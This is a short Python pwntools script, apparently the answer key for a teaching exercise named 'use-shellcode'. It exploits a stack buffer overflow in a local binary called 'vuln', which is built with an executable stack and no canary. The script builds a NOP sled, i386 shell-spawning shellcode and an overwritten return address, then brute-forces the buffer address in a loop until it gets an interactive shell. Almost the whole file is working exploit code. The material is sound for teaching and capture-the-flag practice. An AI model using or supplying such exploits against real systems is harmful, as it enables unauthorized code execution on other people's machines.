#!/usr/bin/env python

"""
Solution (exploit) for use-shellcode task.

Use pwntools (https://docs.pwntools.com/en/stable/) to inject a shellcode and
overwrite the return address of reader() to jump to the shellcode.

The executable is compiled using -zexecstack, doesn't use canary and assumes
ASLR is disabled. To run an ASLR disabled shell, do:
   setarch $(uname -m) -R /bin/bash
"""

import random
import sys
from pwn import *


# offset to return address
offset = 0x40+4

# Obtain the machine code shellcode.
shellcode = asm(shellcraft.i386.linux.sh())

random.seed()
while True:
    # Start process.
    io = process("./vuln")

    # Compute possible address of buffer.
    r = random.getrandbits(8)
    address = 0xffffd000 + (r << 4) + 0
    print "Using address 0x{:08x}".format(address)

    # Craft payload.
    payload = 16 * asm("nop") + shellcode + (offset - 16 - len(shellcode)) * asm("nop") + p32(address)

    # Feed payload to process. If it faults, retry.
    try:
        # Read promt message.
        msg = io.recvline()
        io.sendline(payload)
        # Read hello message.
        msg = io.recvline()
        # See if a shell is active.
        msg = io.recv(timeout=1)
        msg = io.recv(timeout=1)
    except:
        try:
            io.terminate()
        except:
            pass
        io.wait()
        io.close()
        continue

    # If it gets here, shell was opened successfully.
    break

# Yield control to user.
io.interactive()
